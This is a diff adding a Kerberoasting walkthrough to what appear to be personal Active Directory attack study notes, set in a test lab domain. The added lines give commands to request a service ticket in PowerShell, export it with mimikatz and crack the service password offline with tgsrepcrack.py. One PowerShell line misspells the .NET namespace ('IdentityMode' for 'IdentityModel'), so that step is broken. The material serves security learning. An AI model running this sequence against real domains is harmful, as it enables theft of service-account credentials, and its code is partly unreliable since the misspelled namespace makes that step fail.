@@ -55,6 +55,27 @@ KERBEROS AUTHENTICATION - based on the idea of ticketing system
   Flaw
 ‣ when requesting service ticket from DC, no checks are performed on whether user has any permissions to access the service hosted by SPN.
 ‣ If we know target SPN, we can request service ticket for it from DC. We can extract the ticket from from user's memory. Then we can abuse service ticket
-  to try and decrypt the password of the service.
+  to try and decrypt the password of the service using a method called Kerberoasting.
+  
+  Example:
+  First install IIS on Domain controller. Find its FQDN eg: http://dc.hacker.testlab
+  // import powershell namespace
+  PS > Add-Type -AssemblyName System.IdentityModel
+  // request service ticket
+  PS > New-Object System.IdentityMode.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/dc.hacker.testlab'
+  // list the kerberos tickets with built-in klist command
+  PS > klist
+  
+  The service ticket is saved to memory. 
+  // We can view it using mimikatz
+  mimikatz# kerberos::list
+  // and export it
+  mimikatz# kerberos::list /export
+  
+  kerberoasting: We can obtain password hash of the SPN from its service ticket.
+  First transfer the file to kali
+  // On Kali install kerberoast package
+  # apt install kerberoast
+  # python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt service_ticket_name
 
 • LOW AND SLOW PASSWORD GUESSING
